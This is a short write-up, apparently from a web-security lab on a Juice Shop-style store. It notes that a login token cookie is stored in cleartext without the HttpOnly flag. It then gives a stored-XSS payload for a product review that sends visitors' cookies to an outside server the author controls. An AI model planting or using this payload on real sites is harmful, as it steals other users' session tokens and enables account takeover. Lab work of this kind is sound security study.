we can see that a cookie 'token' is stored in browser after login, which is violation of CWE-315: Cleartext Storage of Sensitive Information in a Cookie https://cwe.mitre.org/data/definitions/315.html

but it wasn't stored with httponly, meaning on-page javascript can access that cookie. which is a violation of CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag https://cwe.mitre.org/data/definitions/1004.html

with these, we can craft an xss attack to steal user credential from their browser cookies. 

to do this, we want to put this javascript in one of the product review. so that when other users browse the product, their token gets send back to my server. 

<img src=x onerror="this.src='https://juice.8-thousander.me/?'+document.cookie; this.removeAttribute('onerror');">


